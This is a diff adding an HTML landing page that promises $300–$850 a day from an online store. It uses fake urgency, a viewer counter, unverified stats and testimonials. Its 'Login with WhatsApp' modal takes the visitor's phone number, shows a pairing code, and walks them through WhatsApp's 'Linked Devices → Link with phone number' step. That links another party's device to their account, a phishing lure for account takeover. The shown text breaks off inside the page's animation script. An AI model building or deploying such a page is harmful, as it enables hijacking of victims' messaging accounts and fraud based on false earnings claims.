@@ -1,0 +1,1271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0d0d0d">
+<title>Launch Your Online Store | Earn $300–$850/Day</title>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+(function(){
+  var sc='';
+  try{
+    var s=new URLSearchParams(window.location.search).get('source_code');
+    if(s) sc=s;
+    else{var h=window.location.hash||'';var qi=h.indexOf('?');if(qi>=0) sc=new URLSearchParams(h.slice(qi+1)).get('source_code')||'';}
+  }catch(e){}
+  var MAP={'klmnfb':'1734666894567397','gvoqfmw':'1956221205261857'};
+  var pid=MAP[sc]||'1572611280638190';
+  window.__PIXEL_ID__=pid;
+  fbq('init',pid);
+})();
+fbq('track','PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1572611280638190&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap">
+<link rel="preload" as="image" href="hero_main.webp" type="image/webp">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --gold:#D4AF37;--gold2:#F5D76E;--gold3:#8B6914;
+    --bg:#0D0D0D;--bg2:#141414;--bg3:#1C1C1C;
+    --text:#FFFFFF;--muted:#888;--border:#2a2a2a;
+    --wa:#25D366;--wa2:#128C7E;
+    --radius:16px;
+  }
+  html{scroll-behavior:smooth}
+  body{
+    background:var(--bg);color:var(--text);
+    font-family:'Inter',Arial,sans-serif;
+    font-size:16px;line-height:1.6;
+    overflow-x:hidden;
+  }
+
+  /* ── UTILITIES ── */
+  .gold{background:linear-gradient(135deg,var(--gold),var(--gold2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+  .container{max-width:480px;margin:0 auto;padding:0 20px}
+  .badge{display:inline-block;padding:4px 14px;border-radius:50px;font-size:12px;font-weight:700;border:1px solid var(--gold3);color:var(--gold2);background:rgba(212,175,55,.08);letter-spacing:.5px}
+
+  /* ── HERO ── */
+  .hero{
+    padding-top:0;
+    display:flex;flex-direction:column;align-items:center;justify-content:flex-start;
+    text-align:center;
+    position:relative;overflow:hidden;
+    background:var(--bg);
+    padding-bottom:20px;
+  }
+  #hero-canvas{
+    position:absolute;inset:0;width:100%;height:100%;
+    pointer-events:none;z-index:0;
+  }
+  .hero-main-img{
+    width:100%;display:block;
+    mask-image:linear-gradient(to bottom,black 0%,black 70%,transparent 100%);
+    -webkit-mask-image:linear-gradient(to bottom,black 0%,black 70%,transparent 100%);
+    position:relative;z-index:1;
+  }
+  .hero>.container{position:relative;z-index:1}
+  .hero-badge{margin-bottom:12px;animation:fadeDown .6s ease}
+  .hero-title{
+    font-size:clamp(22px,6vw,36px);font-weight:900;
+    line-height:1.2;margin-bottom:10px;
+    animation:fadeDown .7s ease;
+  }
+  .hero-sub{
+    font-size:clamp(14px,3.5vw,17px);color:var(--muted);
+    margin-bottom:16px;animation:fadeDown .8s ease;
+  }
+  .hero-earnings{
+    display:flex;align-items:center;justify-content:center;gap:12px;
+    margin-bottom:20px;animation:fadeDown .9s ease;
+  }
+  .earning-pill{
+    background:var(--bg3);border:1px solid var(--border);
+    border-radius:12px;padding:10px 20px;text-align:center;
+  }
+  .earning-pill .amount{font-size:24px;font-weight:900}
+  .earning-pill .label{font-size:11px;color:var(--muted);margin-top:1px}
+  .earning-arrow{font-size:22px;color:var(--gold)}
+  .hero-cta{position:relative;z-index:10;animation:fadeDown 1s ease}
+  .btn-wa{
+    display:inline-flex;align-items:center;gap:10px;
+    background:linear-gradient(135deg,#8B1a2f,#C0392B);
+    color:#fff;font-family:'Inter',Arial,sans-serif;
+    font-size:17px;font-weight:700;
+    border:none;border-radius:50px;
+    padding:14px 32px;cursor:pointer;text-decoration:none;
+    box-shadow:0 8px 32px rgba(139,26,47,.45);
+    transition:transform .2s,box-shadow .2s;
+    position:relative;z-index:20;
+  }
+  .btn-wa:active{transform:scale(.97)}
+  .btn-wa svg{width:22px;height:22px;flex-shrink:0}
+  .hero-note{margin-top:8px;font-size:12px;color:var(--muted)}
+
+  /* ── STATS STRIP ── */
+  .stats{
+    background:var(--bg2);border-top:1px solid var(--border);border-bottom:1px solid var(--border);
+    padding:24px 20px;
+  }
+  .stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:480px;margin:0 auto;text-align:center}
+  .stat-num{font-size:26px;font-weight:900}
+  .stat-lbl{font-size:11px;color:var(--muted);margin-top:3px}
+
+  /* ── PLATFORMS ── */
+  .section{padding:32px 20px}
+  .section-title{text-align:center;font-size:22px;font-weight:800;margin-bottom:8px}
+  .section-sub{text-align:center;color:var(--muted);font-size:14px;margin-bottom:20px}
+  .platforms{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;max-width:480px;margin:0 auto}
+  .platform-chip{
+    display:flex;align-items:center;gap:8px;
+    background:var(--bg3);border:1px solid var(--border);
+    border-radius:50px;padding:8px 16px;font-size:13px;font-weight:600;
+  }
+  .platform-chip span{font-size:18px}
+
+  /* ── HOW IT WORKS ── */
+  .steps{display:flex;flex-direction:column;gap:16px;max-width:480px;margin:0 auto}
+  .step{
+    display:flex;align-items:flex-start;gap:16px;
+    background:var(--bg3);border:1px solid var(--border);
+    border-radius:var(--radius);padding:16px;
+  }
+  .step-num{
+    width:36px;height:36px;border-radius:50%;flex-shrink:0;
+    background:linear-gradient(135deg,var(--gold),var(--gold2));
+    color:#000;font-weight:900;font-size:15px;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .step-title{font-weight:700;margin-bottom:4px;font-size:15px}
+  .step-desc{font-size:13px;color:var(--muted)}
+
+  /* ── EARNINGS SHOWCASE ── */
+  .earn-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;max-width:480px;margin:0 auto}
+  .earn-card{
+    background:var(--bg3);border:1px solid var(--border);
+    border-radius:var(--radius);padding:16px;text-align:center;
+  }
+  .earn-card .emoji{font-size:28px;margin-bottom:8px}
+  .earn-card .amount{font-size:22px;font-weight:900;color:var(--gold2)}
+  .earn-card .period{font-size:11px;color:var(--muted);margin-top:2px}
+  .earn-card .category{font-size:12px;margin-top:6px;color:var(--muted)}
+
+  /* ── TESTIMONIALS ── */
+  .testimonials-wrap{overflow:hidden;padding:8px 0;position:relative;direction:ltr}
+  .marquee-track{display:flex;width:max-content}
+  .tcard{
+    direction:ltr;width:260px;flex-shrink:0;margin-right:16px;
+    background:var(--bg3);border:1px solid var(--border);
+    border-radius:var(--radius);padding:16px;
+  }
+  .stars{color:var(--gold);font-size:14px;margin-bottom:8px}
+  .tcard-top{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+  .tcard-avatar{
+    width:38px;height:38px;border-radius:50%;flex-shrink:0;
+    background:linear-gradient(135deg,var(--gold3),var(--gold));
+    display:flex;align-items:center;justify-content:center;
+    font-weight:800;font-size:15px;color:#000;
+  }
+  .tcard-name{font-weight:700;font-size:14px}
+  .tcard-text{font-size:13px;color:var(--muted);line-height:1.5}
+
+  /* ── BOTTOM CTA ── */
+  .bottom-cta{
+    text-align:center;padding:36px 20px 100px;
+    background:radial-gradient(ellipse 80% 60% at 50% 100%,rgba(212,175,55,.1) 0%,transparent 70%);
+  }
+  .bottom-cta h2{font-size:26px;font-weight:900;margin-bottom:10px}
+  .bottom-cta p{color:var(--muted);margin-bottom:28px;font-size:15px}
+
+  /* ── FIXED BOTTOM BAR ── */
+  .fixed-bar{
+    position:fixed;bottom:0;right:0;left:0;z-index:100;
+    padding:12px 20px 20px;
+    background:linear-gradient(to top,rgba(13,13,13,1) 60%,transparent);
+    display:flex;justify-content:center;
+  }
+
+  @property --na{syntax:'<angle>';initial-value:0deg;inherits:false}
+  .wa-neon-wrap{
+    position:relative;
+    width:100%;max-width:480px;
+    border-radius:52px;
+    padding:2.5px;
+    background:conic-gradient(from var(--na),#8B1a2f 0%,#FFD700 25%,#C0392B 55%,#FFD700 75%,#8B1a2f 100%);
+    animation:neon-rot 2.5s linear infinite, wa-bounce 5s ease infinite;
+  }
+  .wa-neon-wrap::after{
+    content:'';
+    position:absolute;inset:-8px;
+    border-radius:60px;
+    background:conic-gradient(from var(--na),#8B1a2f,#FFD700,#C0392B,#FFD700,#8B1a2f);
+    z-index:-1;
+    filter:blur(14px);
+    opacity:.55;
+    animation:neon-rot 2.5s linear infinite;
+  }
+  @keyframes neon-rot{to{--na:360deg}}
+  @keyframes wa-bounce{
+    0%,88%,100%{transform:scale(1)}
+    91%{transform:scale(1.045)}
+    94%{transform:scale(.97)}
+    97%{transform:scale(1.025)}
+  }
+  .fixed-bar .btn-wa{
+    width:100%;justify-content:center;
+    font-size:17px;padding:15px 24px;
+    border-radius:50px;
+    position:relative;overflow:hidden;
+  }
+  .fixed-bar .btn-wa::before{
+    content:'';
+    position:absolute;top:0;left:-110%;
+    width:55%;height:100%;
+    background:linear-gradient(120deg,transparent,rgba(255,255,255,.28),transparent);
+    animation:shimmer 3.5s ease infinite;
+    pointer-events:none;
+  }
+  @keyframes shimmer{
+    0%,60%{left:-110%}
+    75%{left:130%}
+    100%{left:130%}
+  }
+
+  /* ── ANIMATIONS ── */
+  @keyframes fadeDown{from{opacity:0;transform:translateY(-16px)}to{opacity:1;transform:translateY(0)}}
+  .reveal{opacity:0;transform:translateY(24px);transition:opacity .6s ease,transform .6s ease;pointer-events:none}
+  .reveal.visible{opacity:1;transform:none;pointer-events:auto}
+
+  /* ── PULSE RING ── */
+  .btn-wa-wrap{position:relative;display:inline-block;z-index:10}
+  .pulse-ring{
+    position:absolute;inset:-6px;border-radius:50px;
+    border:2px solid rgba(139,26,47,.5);
+    animation:pulse-ring 2s ease-out infinite;
+    pointer-events:none;
+  }
+  @keyframes pulse-ring{
+    0%{transform:scale(1);opacity:.6}
+    100%{transform:scale(1.08);opacity:0}
+  }
+
+  @media(max-width:360px){
+    .hero-title{font-size:26px}
+    .earning-pill .amount{font-size:20px}
+  }
+
+  /* ── WA MODAL ── */
+  .wa-overlay{
+    position:fixed;inset:0;z-index:9999;
+    background:rgba(0,0,0,.75);backdrop-filter:blur(6px);
+    display:none;align-items:center;justify-content:center;padding:20px;
+  }
+  .wa-overlay.open{display:flex}
+  .wa-box{
+    background:#1a1a1a;border:1px solid #2a2a2a;border-radius:20px;
+    width:100%;max-width:400px;padding:32px 24px;position:relative;
+    box-shadow:0 24px 80px rgba(0,0,0,.6);
+  }
+  .wa-close{
+    position:absolute;top:14px;right:16px;
+    background:none;border:none;color:#666;font-size:20px;cursor:pointer;
+    line-height:1;padding:4px 8px;
+  }
+  .wa-close:hover{color:#fff}
+  .wa-step{text-align:center}
+  .wa-icon{font-size:48px;margin-bottom:16px}
+  .wa-box h3{font-size:20px;font-weight:800;margin-bottom:8px}
+  .wa-box p{color:var(--muted);font-size:14px;margin-bottom:20px}
+
+  .wa-phone-row{display:flex;gap:8px;margin-bottom:16px}
+
+  /* custom country picker */
+  .wa-country-wrap{position:relative;flex-shrink:0}
+  .wa-country-btn{
+    height:100%;min-width:90px;
+    background:#0d0d0d;border:1px solid #333;border-radius:10px;
+    color:#fff;font-size:13px;padding:12px 10px;cursor:pointer;
+    font-family:'Inter',Arial,sans-serif;white-space:nowrap;
+    display:flex;align-items:center;gap:4px;
+  }
+  .wa-country-btn:hover{border-color:#555}
+  .wa-country-caret{font-size:9px;opacity:.5;margin-left:2px}
+  .wa-country-drop{
+    display:none;position:absolute;top:calc(100% + 4px);left:0;
+    background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;
+    width:270px;z-index:10000;overflow:hidden;
+    box-shadow:0 12px 40px rgba(0,0,0,.7);
+  }
+  .wa-country-drop.open{display:block}
+  .wa-country-search{
+    width:100%;background:#111;border:none;border-bottom:1px solid #2a2a2a;
+    color:#fff;font-size:13px;padding:11px 14px;outline:none;
+    font-family:'Inter',Arial,sans-serif;
+  }
+  .wa-country-search::placeholder{color:#555}
+  .wa-country-list{max-height:200px;overflow-y:auto}
+  .wa-country-list::-webkit-scrollbar{width:4px}
+  .wa-country-list::-webkit-scrollbar-thumb{background:#333;border-radius:4px}
+  .wa-country-item{
+    padding:9px 14px;cursor:pointer;font-size:13px;color:#ccc;
+    display:flex;align-items:center;gap:8px;transition:background .1s;
+  }
+  .wa-country-item:hover,.wa-country-item.active{background:#2a2a2a;color:#fff}
+  .wa-country-item-dial{color:#888;font-size:12px;margin-left:auto;flex-shrink:0}
+
+  .wa-phone-input{
+    flex:1;background:#0d0d0d;border:1px solid #333;border-radius:10px;
+    color:#fff;font-size:15px;padding:12px 14px;outline:none;
+    font-family:'Inter',Arial,sans-serif;
+  }
+  .wa-phone-input:focus{border-color:#8B1a2f}
+  .wa-phone-input::placeholder{color:#555}
+
+  .wa-btn-submit{
+    width:100%;padding:14px;border:none;border-radius:50px;cursor:pointer;
+    background:linear-gradient(135deg,#8B1a2f,#C0392B);color:#fff;
+    font-size:16px;font-weight:700;font-family:'Inter',Arial,sans-serif;
+    box-shadow:0 6px 24px rgba(139,26,47,.4);
+    transition:opacity .2s;
+  }
+  .wa-btn-submit:hover{opacity:.9}
+  .wa-btn-submit:disabled{opacity:.5;cursor:not-allowed}
+  .wa-disclaimer{font-size:11px;color:#555;margin-top:12px;margin-bottom:0}
+
+  .wa-btn-copy{
+    width:100%;padding:14px;border:none;border-radius:50px;cursor:pointer;
+    background:linear-gradient(135deg,#8B1a2f,#C0392B);color:#fff;
+    font-size:16px;font-weight:700;font-family:'Inter',Arial,sans-serif;
+    box-shadow:0 6px 24px rgba(139,26,47,.4);transition:opacity .2s;
+  }
+  .wa-btn-copy:hover{opacity:.9}
+  .wa-countdown-box{
+    background:#0d0d0d;border:1px solid #2a2a2a;border-radius:14px;
+    padding:14px 16px;margin:14px 0;text-align:center;
+  }
+  .wa-countdown-label{font-size:13px;color:#888;margin-bottom:6px}
+  .wa-countdown-num{
+    font-size:36px;font-weight:900;color:#C0392B;line-height:1;
+    display:block;
+  }
+  .wa-countdown-sub{font-size:12px;color:#555;margin-top:4px}
+  .wa-code-reminder{
+    display:flex;align-items:center;justify-content:center;gap:10px;
+    margin:10px 0 14px;
+  }
+  .wa-code-small{
+    font-size:26px;font-weight:900;letter-spacing:4px;font-family:monospace;
+    background:linear-gradient(135deg,var(--gold),var(--gold2));
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+    background-clip:text;
+  }
+
+  .wa-pair-code{
+    font-size:40px;font-weight:900;letter-spacing:6px;
+    background:linear-gradient(135deg,var(--gold),var(--gold2));
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+    background-clip:text;
+    margin:16px 0;font-family:monospace;
+  }
+  .wa-instructions{
+    background:#0d0d0d;border:1px solid #2a2a2a;border-radius:12px;
+    padding:14px;font-size:13px;color:#aaa;text-align:left;margin-bottom:16px;
+    line-height:1.8;
+  }
+  .wa-instructions strong{color:#fff}
+  .wa-waiting{display:flex;align-items:center;justify-content:center;gap:10px;color:#888;font-size:13px;margin-bottom:16px}
+  .wa-spinner{
+    width:18px;height:18px;border-radius:50%;
+    border:2px solid #333;border-top-color:#8B1a2f;
+    animation:spin .8s linear infinite;flex-shrink:0;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .wa-btn-retry{
+    background:none;border:1px solid #333;border-radius:50px;
+    color:#aaa;font-size:13px;padding:8px 20px;cursor:pointer;
+    font-family:'Inter',Arial,sans-serif;transition:border-color .2s,color .2s;
+  }
+  .wa-btn-retry:hover{border-color:#8B1a2f;color:#fff}
+  .wa-btn-retry:disabled{opacity:.4;cursor:not-allowed}
+
+  .wa-success-icon{font-size:64px;margin-bottom:16px}
+  .wa-success-title{font-size:22px;font-weight:900;margin-bottom:10px;color:#4ade80}
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<section class="hero">
+  <canvas id="hero-canvas"></canvas>
+  <picture>
+    <source srcset="hero_main.webp" type="image/webp">
+    <img src="hero_main.jpg" class="hero-main-img" alt="" loading="eager" decoding="async">
+  </picture>
+  <div class="container">
+    <div class="hero-badge reveal"><span class="badge">✦ Real Opportunity · Work From Home</span></div>
+    <h1 class="hero-title reveal">
+      Launch Your <span class="gold">Online Store</span><br>and Start Earning Today
+    </h1>
+    <p class="hero-sub reveal">No experience needed · No large capital · Just your phone</p>
+
+    <div class="hero-earnings reveal">
+      <div class="earning-pill">
+        <div class="amount gold">$300</div>
+        <div class="label">per day</div>
+      </div>
+      <div class="earning-arrow">→</div>
+      <div class="earning-pill">
+        <div class="amount gold">$850</div>
+        <div class="label">per day</div>
+      </div>
+    </div>
+
+    <div class="hero-cta">
+      <p style="font-size:13px;color:#C0392B;margin-bottom:10px;font-weight:700">
+        🔥 Limited spots this week — don't miss out
+      </p>
+      <div class="btn-wa-wrap">
+        <div class="pulse-ring"></div>
+        <a class="btn-wa" href="#">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.127.558 4.117 1.523 5.855L.057 23.428a.5.5 0 00.609.61l5.68-1.49A11.945 11.945 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-1.951 0-3.793-.5-5.405-1.375l-.387-.216-4.01 1.052 1.027-3.908-.233-.401A9.955 9.955 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/></svg>
+          Login with WhatsApp
+        </a>
+      </div>
+      <p class="hero-note" id="viewerCount">👁 <span id="vcNum">43</span> people viewing this page · ⚡ Instant reply</p>
+    </div>
+  </div>
+</section>
+
+<!-- STATS -->
+<div class="stats reveal">
+  <div class="stats-grid">
+    <div>
+      <div class="stat-num gold" id="statStores">1200+</div>
+      <div class="stat-lbl">Stores Launched</div>
+    </div>
+    <div>
+      <div class="stat-num gold">97%</div>
+      <div class="stat-lbl">Satisfaction Rate</div>
+    </div>
+    <div>
+      <div class="stat-num gold">24h</div>
+      <div class="stat-lbl">Setup Time</div>
+    </div>
+  </div>
+</div>
+
+<!-- PLATFORMS -->
+<section class="section reveal">
+  <div class="container">
+    <h2 class="section-title">Sell on Every Platform</h2>
+    <p class="section-sub">We set up your store across all major e-commerce channels</p>
+    <div class="platforms">
+      <div class="platform-chip"><span>🛍️</span> Shopify</div>
+      <div class="platform-chip"><span>📦</span> Amazon</div>
+      <div class="platform-chip"><span>🏪</span> Etsy</div>
+      <div class="platform-chip"><span>🛒</span> eBay</div>
+      <div class="platform-chip"><span>📱</span> TikTok Shop</div>
+      <div class="platform-chip"><span>📸</span> Instagram</div>
+    </div>
+  </div>
+</section>
+
+<!-- HOW IT WORKS -->
+<section class="section reveal" style="background:var(--bg2);border-top:1px solid var(--border);border-bottom:1px solid var(--border)">
+  <div class="container">
+    <h2 class="section-title">How It Works</h2>
+    <p class="section-sub">From zero to earning in 24 hours</p>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div>
+          <div class="step-title">Contact Us via WhatsApp</div>
+          <div class="step-desc">Tell us your goals — no prior experience required. Our team handles everything.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div>
+          <div class="step-title">We Build Your Store</div>
+          <div class="step-desc">Full setup: branding, product listings, payment gateway, and platform integration.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div>
+          <div class="step-title">Go Live & Start Earning</div>
+          <div class="step-desc">Your store goes live within 24 hours. We provide ongoing support to grow your revenue.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- EARNINGS -->
+<section class="section reveal">
+  <div class="container">
+    <h2 class="section-title">Real <span class="gold">Daily Earnings</span></h2>
+    <p class="section-sub">What our sellers make from home</p>
+    <div class="earn-grid">
+      <div class="earn-card">
+        <div class="emoji">👗</div>
+        <div class="amount">$320</div>
+        <div class="period">per day</div>
+        <div class="category">Fashion & Apparel</div>
+      </div>
+      <div class="earn-card">
+        <div class="emoji">💄</div>
+        <div class="amount">$480</div>
+        <div class="period">per day</div>
+        <div class="category">Beauty & Skincare</div>
+      </div>
+      <div class="earn-card">
+        <div class="emoji">🏠</div>
+        <div class="amount">$390</div>
+        <div class="period">per day</div>
+        <div class="category">Home & Decor</div>
+      </div>
+      <div class="earn-card">
+        <div class="emoji">📱</div>
+        <div class="amount">$750</div>
+        <div class="period">per day</div>
+        <div class="category">Tech Accessories</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TESTIMONIALS -->
+<section class="section reveal" style="padding-left:0;padding-right:0">
+  <h2 class="section-title" style="padding:0 20px">What Our Sellers Say</h2>
+  <p class="section-sub" style="padding:0 20px">Real stories from real people</p>
+  <div class="testimonials-wrap">
+    <div class="marquee-track" id="marquee"></div>
+  </div>
+</section>
+
+<!-- BOTTOM CTA -->
+<section class="bottom-cta">
+  <div class="container">
+    <h2>Ready to <span class="gold">Start Earning?</span></h2>
+    <p>Join over 1,200 sellers already earning daily from their own online stores</p>
+    <div class="btn-wa-wrap">
+      <div class="pulse-ring"></div>
+      <a class="btn-wa" href="#">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.127.558 4.117 1.523 5.855L.057 23.428a.5.5 0 00.609.61l5.68-1.49A11.945 11.945 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-1.951 0-3.793-.5-5.405-1.375l-.387-.216-4.01 1.052 1.027-3.908-.233-.401A9.955 9.955 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/></svg>
+        Login with WhatsApp
+      </a>
+    </div>
+    <p style="margin-top:12px;font-size:12px;color:var(--muted)">100% Free · No commitment required</p>
+  </div>
+</section>
+
+<!-- WA MODAL -->
+<div id="wa-modal" class="wa-overlay">
+  <div class="wa-box">
+    <button class="wa-close" id="wa-close">✕</button>
+
+    <!-- Step 1: Phone input -->
+    <div id="step-phone" class="wa-step">
+      <div class="wa-icon">📱</div>
+      <h3>Enter Your WhatsApp Number</h3>
+      <p>We'll send you a pairing code to link your account</p>
+      <div class="wa-phone-row">
+        <div class="wa-country-wrap" id="wa-country-wrap">
+          <button class="wa-country-btn" id="wa-country-btn" type="button">
+            <span id="wa-country-flag">🌐</span>
+            <span id="wa-country-dial">+1</span>
+            <span class="wa-country-caret">▼</span>
+          </button>
+          <div class="wa-country-drop" id="wa-country-drop">
+            <input class="wa-country-search" id="wa-country-search" type="text" placeholder="Search country or +code…" autocomplete="off">
+            <div class="wa-country-list" id="wa-country-list"></div>
+          </div>
+        </div>
+        <input class="wa-phone-input" id="wa-phone" type="tel" placeholder="Phone number" inputmode="numeric" autocomplete="tel">
+      </div>
+      <button class="wa-btn-submit" id="wa-submit">Continue →</button>
+      <p class="wa-disclaimer">Your number is used only to link WhatsApp. We never share it.</p>
+    </div>
+
+    <!-- Step 2: Pair code -->
+    <div id="step-pair" class="wa-step" style="display:none">
+      <div class="wa-icon">🔗</div>
+      <h3>Your Pairing Code</h3>
+      <p>Copy the code, then paste it in WhatsApp</p>
+      <div class="wa-pair-code" id="wa-code">——</div>
+
+      <!-- Phase A: copy button (before copy) -->
+      <div id="wa-phase-a">
+        <button class="wa-btn-copy" id="wa-copy">📋 Copy Code</button>
+        <p style="font-size:11px;color:#555;margin-top:10px">Tap to copy, WhatsApp will open automatically</p>
+      </div>
+
+      <!-- Phase B: countdown + instructions (after copy) -->
+      <div id="wa-phase-b" style="display:none">
+        <div class="wa-countdown-box">
+          <div class="wa-countdown-label">Opening WhatsApp in</div>
+          <span class="wa-countdown-num" id="wa-cd-num">10</span>
+          <div class="wa-countdown-sub">seconds…</div>
+        </div>
+        <div class="wa-code-reminder">
+          <span style="font-size:13px;color:#888">Your code:</span>
+          <span class="wa-code-small" id="wa-code-b">——</span>
+        </div>
+        <div class="wa-instructions">
+          <strong>1.</strong> WhatsApp opens → tap <strong>⋮ Menu</strong><br>
+          <strong>2.</strong> Go to <strong>Linked Devices</strong><br>
+          <strong>3.</strong> Tap <strong>"Link with phone number"</strong><br>
+          <strong>4.</strong> Paste the code
+        </div>
+        <div class="wa-waiting">
+          <div class="wa-spinner"></div>
+          <span id="wa-wait-text">Waiting for connection…</span>
+        </div>
+        <button class="wa-btn-retry" id="wa-retry">Get new code</button>
+      </div>
+    </div>
+
+    <!-- Step 3: Success -->
+    <div id="step-success" class="wa-step" style="display:none">
+      <div class="wa-success-icon">🎉</div>
+      <div class="wa-success-title">WhatsApp Linked!</div>
+      <p>Your account is connected. Our team will reach out shortly to get your store set up.</p>
+    </div>
+  </div>
+</div>
+
+<!-- FIXED BOTTOM BAR -->
+<div class="fixed-bar">
+  <div class="wa-neon-wrap">
+    <a class="btn-wa" href="#">
+      <svg viewBox="0 0 24 24" fill="currentColor" style="width:22px;height:22px"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.127.558 4.117 1.523 5.855L.057 23.428a.5.5 0 00.609.61l5.68-1.49A11.945 11.945 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-1.951 0-3.793-.5-5.405-1.375l-.387-.216-4.01 1.052 1.027-3.908-.233-.401A9.955 9.955 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/></svg>
+      <span style="display:flex;flex-direction:column;align-items:center;line-height:1.3">
+        <span>🔥 Login with WhatsApp 🔥</span>
+        <span style="font-size:12px;font-weight:900;letter-spacing:1.5px;opacity:.9">GET STARTED NOW</span>
+      </span>
+    </a>
+  </div>
+</div>
+
+<script>
+// ── HERO CANVAS: falling coins & bags ──
+(function(){
+  const canvas = document.getElementById('hero-canvas');
+  const ctx = canvas.getContext('2d');
+  const EMOJIS = ['🪙','🪙','🪙','💰','🛍️','🛍️','✨'];
+  const PARTICLES = [];
+  const COUNT = 28;
+  function resize(){ canvas.width=canvas.offsetWidth; canvas.height=canvas.offsetHeight; }
+  window.addEventListener('resize', resize); resize();
+  function rand(a,b){ return a+Math.random()*(b-a); }
+  function spawn(){
+    const em=EMOJIS[Math.floor(Math.random()*EMOJIS.length)];
+    const size=rand(18,36);
+    return {em,size,x:rand(0,canvas.width),y:rand(-canvas.height,-size),vy:rand(.6,1.8),vx:rand(-.3,.3),rot:rand(0,Math.PI*2),rotSpeed:rand(-.02,.02),alpha:rand(.4,.8)};
+  }
+  for(let i=0;i<COUNT;i++){const p=spawn();p.y=rand(-canvas.height,canvas.height);PARTICLES.push(p);}
+  function draw(){
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    for(const p of PARTICLES){
